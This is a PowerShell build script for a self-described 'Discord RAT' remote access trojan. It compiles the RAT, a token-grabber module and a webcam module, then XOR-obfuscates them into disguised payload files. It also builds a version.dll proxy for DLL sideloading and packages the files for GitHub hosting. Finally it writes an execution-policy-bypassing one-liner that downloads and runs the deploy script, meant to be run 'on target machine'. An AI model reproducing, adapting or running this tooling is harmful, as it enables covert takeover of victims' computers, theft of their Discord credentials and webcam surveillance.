# Discord RAT - Shaher dev Edition - PowerShell Build Script
# Enhanced build script with error handling and optimization

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Discord RAT - Shaher dev Edition Builder" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Function to find MSBuild
function Find-MSBuild {
    $msbuildPaths = @(
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Insiders\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Professional\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\18\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Professional\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles}\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Professional\MSBuild\Current\Bin\MSBuild.exe",
        "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\Enterprise\MSBuild\Current\Bin\MSBuild.exe"
    )
    
    foreach ($path in $msbuildPaths) {
        if (Test-Path $path) {
            return $path
        }
    }
    
    # Fallback: search Visual Studio install folders
    foreach ($root in @("${env:ProgramFiles}\Microsoft Visual Studio", "${env:ProgramFiles(x86)}\Microsoft Visual Studio")) {
        if (Test-Path $root) {
            $found = Get-ChildItem -Path $root -Filter MSBuild.exe -Recurse -ErrorAction SilentlyContinue |
                Where-Object { $_.FullName -match '\\MSBuild\\Current\\Bin\\MSBuild\.exe$' } |
                Select-Object -First 1
            if ($found) {
                return $found.FullName
            }
        }
    }
    
    # Try to find in PATH
    $msbuild = Get-Command msbuild -ErrorAction SilentlyContinue
    if ($msbuild) {
        return $msbuild.Source
    }
    
    return $null
}

# Find MSBuild
$msbuildPath = Find-MSBuild
if (-not $msbuildPath) {
    Write-Host "ERROR: MSBuild not found. Please install Visual Studio or Visual Studio Build Tools." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "Using MSBuild: $msbuildPath" -ForegroundColor Green
Write-Host ""

# Create output directories
$buildDir = "build"
$modulesDir = "build\modules"
if (-not (Test-Path $buildDir)) { New-Item -ItemType Directory -Path $buildDir -Force | Out-Null }
if (-not (Test-Path $modulesDir)) { New-Item -ItemType Directory -Path $modulesDir -Force | Out-Null }

# Build function
function Build-Project {
    param(
        [string]$ProjectPath,
        [string]$ProjectName,
        [string]$OutputPath = "..\build\",
        [string]$Platform = $(if ($ProjectPath -like '*.sln') { 'Any CPU' } else { 'AnyCPU' })
    )
    
    Write-Host "Building $ProjectName..." -ForegroundColor Yellow
    
    & $msbuildPath $ProjectPath `
        /p:Configuration=Release `
        "/p:Platform=$Platform" `
        "/p:OutputPath=$OutputPath" `
        /verbosity:minimal `
        /nologo 2>&1 | ForEach-Object {
            if ($_ -is [System.Management.Automation.ErrorRecord]) {
                Write-Host $_.ToString() -ForegroundColor Red
            } else {
                Write-Host $_
            }
        }
    $exitCode = $LASTEXITCODE
    
    if ($exitCode -eq 0) {
        Write-Host "[OK] $ProjectName built successfully" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[FAIL] Failed to build $ProjectName (Exit code: $exitCode)" -ForegroundColor Red
        return $false
    }
}

# Build projects
$success = $true

# Build main application
if (-not (Build-Project "Discord rat\Discord rat.sln" "Discord RAT - Main Application")) {
    $success = $false
}

# Build Token Grabber module
if (-not (Build-Project "Token grabber\Token grabber.csproj" "Token Grabber Module" "..\build\modules\")) {
    $success = $false
}

# Build Webcam module
if (-not (Build-Project "Webcam\Webcam.csproj" "Webcam Module" "..\build\modules\")) {
    $success = $false
}

function Protect-PayloadFile {
    param(
        [string]$InputPath,
        [string]$OutputPath,
        [byte]$XorKey = 0xA7
    )

    $bytes = [System.IO.File]::ReadAllBytes($InputPath)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $XorKey
    }

    $outputDir = Split-Path $OutputPath -Parent
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }

    [System.IO.File]::WriteAllBytes($OutputPath, $bytes)
}

function Prepare-ProxyPayloads {
    Write-Host "Preparing protected payload files..." -ForegroundColor Yellow

    $requiredFiles = @{
        "build\Discord rat.dll" = "build\payload\core.bin"
        "build\modules\Token grabber.dll" = "build\payload\modules\token.bin"
        "build\modules\Webcam.dll" = "build\payload\modules\media.bin"
    }

    foreach ($entry in $requiredFiles.GetEnumerator()) {
        if (-not (Test-Path $entry.Key)) {
            Write-Host "[FAIL] Missing payload file: $($entry.Key)" -ForegroundColor Red
            return $false
        }
        Protect-PayloadFile -InputPath $entry.Key -OutputPath $entry.Value
    }

    if (-not (Test-Path "build\Loader.exe")) {
        Write-Host "[FAIL] Missing Loader.exe for proxy build" -ForegroundColor Red
        return $false
    }

    Copy-Item "build\Loader.exe" "build\RuntimeHost.exe" -Force
    Write-Host "[OK] Protected payloads + RuntimeHost.exe ready" -ForegroundColor Green
    return $true
}

function Build-ProxyDll {
    Write-Host "Building version.dll proxy (x64 + x86, GitHub mode - no embedded payload)..." -ForegroundColor Yellow

    if (-not (Prepare-ProxyPayloads)) {
        return $false
    }

    $vcvars64 = Get-ChildItem "${env:ProgramFiles}\Microsoft Visual Studio" -Filter vcvars64.bat -Recurse -ErrorAction SilentlyContinue |
        Select-Object -First 1
    $vcvars32 = Get-ChildItem "${env:ProgramFiles}\Microsoft Visual Studio" -Filter vcvars32.bat -Recurse -ErrorAction SilentlyContinue |
        Select-Object -First 1

    if (-not $vcvars64) {
        Write-Host "[WARN] vcvars64.bat not found. Skipping version.dll proxy build." -ForegroundColor Yellow
        return $true
    }

    New-Item -ItemType Directory -Path "build\proxy\x64" -Force | Out-Null
    New-Item -ItemType Directory -Path "build\proxy\x86" -Force | Out-Null

    $builtAny = $false

    $x64Cmd = "`"$($vcvars64.FullName)`" && cl /nologo /LD proxy\version.cpp /Fe:build\proxy\x64\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib"
    cmd /c $x64Cmd 2>&1 | ForEach-Object { Write-Host $_ }
    if (Test-Path "build\proxy\x64\version.dll") {
        Copy-Item "build\proxy\x64\version.dll" "build\version.dll" -Force
        $builtAny = $true
        $sizeKb = [math]::Round((Get-Item "build\version.dll").Length / 1KB, 1)
        Write-Host "[OK] version.dll (x64) built - ${sizeKb} KB (lightweight proxy)" -ForegroundColor Green
    }

    if ($vcvars32) {
        $x86Cmd = "`"$($vcvars32.FullName)`" && cl /nologo /LD proxy\version.cpp /Fe:build\proxy\x86\version.dll /link /DEF:proxy\version.exports.def shell32.lib strsafe.lib"
        cmd /c $x86Cmd 2>&1 | ForEach-Object { Write-Host $_ }
        if (Test-Path "build\proxy\x86\version.dll") {
            $builtAny = $true
            Write-Host "[OK] version.dll (x86) built" -ForegroundColor Green
        }
    }

    Remove-Item "build\version.obj", "build\version.exp", "build\version.lib" -ErrorAction SilentlyContinue

    if (-not $builtAny) {
        Write-Host "[WARN] version.dll proxy build failed." -ForegroundColor Yellow
    }

    return $true
}

function Prepare-GithubDeployPackage {
    Write-Host "Preparing GitHub deploy package..." -ForegroundColor Yellow

    $githubDir = "build\github"
    $githubModules = Join-Path $githubDir "modules"
    New-Item -ItemType Directory -Path $githubModules -Force | Out-Null

    $copyMap = @{
        "build\version.dll" = Join-Path $githubDir "version.dll"
        "build\RuntimeHost.exe" = Join-Path $githubDir "RuntimeHost.exe"
        "build\payload\core.bin" = Join-Path $githubDir "core.bin"
        "build\payload\modules\token.bin" = Join-Path $githubModules "token.bin"
        "build\payload\modules\media.bin" = Join-Path $githubModules "media.bin"
    }

    foreach ($entry in $copyMap.GetEnumerator()) {
        if (-not (Test-Path $entry.Key)) {
            Write-Host "[FAIL] Missing file for GitHub package: $($entry.Key)" -ForegroundColor Red
            return $false
        }
        Copy-Item $entry.Key $entry.Value -Force
    }

    $configPath = "deploy\config.json"
    $githubBaseUrl = "https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/deploy"
    if (Test-Path $configPath) {
        $config = Get-Content $configPath -Raw | ConvertFrom-Json
        if ($config.GitHubBaseUrl) {
            $githubBaseUrl = $config.GitHubBaseUrl
        }
    }

    $deployScript = Get-Content "deploy\deploy.ps1" -Raw
    $deployScript = $deployScript -replace '(?m)^(\s*\[string\]\$GitHubBaseUrl = )"[^"]*"', "`${1}`"$githubBaseUrl`""

    Set-Content -Path (Join-Path $githubDir "deploy.ps1") -Value $deployScript -Encoding UTF8
    Copy-Item "deploy\deploy.cmd" (Join-Path $githubDir "deploy.cmd") -Force
    Copy-Item "deploy\config.json" (Join-Path $githubDir "config.json") -Force

    $oneLiner = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""iex ((New-Object Net.WebClient).DownloadString('$githubBaseUrl/deploy.ps1'))"""
    $oneLinerCmd = "@echo off`r`n$oneLiner`r`npause"
    Set-Content -Path (Join-Path $githubDir "install.cmd") -Value $oneLinerCmd -Encoding ASCII
    Set-Content -Path (Join-Path $githubDir "install_oneliner.txt") -Value $oneLiner -Encoding ASCII

    Write-Host "[OK] GitHub package ready: build\github\" -ForegroundColor Green
    Write-Host "     Upload the contents of build\github\ to your repo under /deploy/" -ForegroundColor Gray
    Write-Host ""
    Write-Host "One-liner CMD:" -ForegroundColor Cyan
    Write-Host $oneLiner -ForegroundColor White
    return $true
}

if (-not (Build-ProxyDll)) {
    $success = $false
}

if (-not (Prepare-GithubDeployPackage)) {
    $success = $false
}

Write-Host ""
if ($success) {
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "Build completed successfully!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output files:" -ForegroundColor Cyan
    Write-Host "- GitHub upload folder: build\github\  (upload to repo /deploy/)" -ForegroundColor White
    Write-Host "- One-liner: build\github\install_oneliner.txt" -ForegroundColor White
    Write-Host "- Sideload proxy: build\version.dll  (small, ~few KB)" -ForegroundColor White
    Write-Host "- Protected payload: build\payload\core.bin (+ modules/*.bin)" -ForegroundColor White
    Write-Host ""
    Write-Host "GitHub setup:" -ForegroundColor Cyan
    Write-Host "1. Edit deploy\config.json with your GitHub raw URL" -ForegroundColor White
    Write-Host "2. Upload build\github\* to your repo under deploy/" -ForegroundColor White
    Write-Host "3. Run the one-liner CMD on target machine" -ForegroundColor White
} else {
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "Build failed!" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "Please check the error messages above and fix any issues." -ForegroundColor Yellow
}

Write-Host ""
Read-Host "Press Enter to exit"
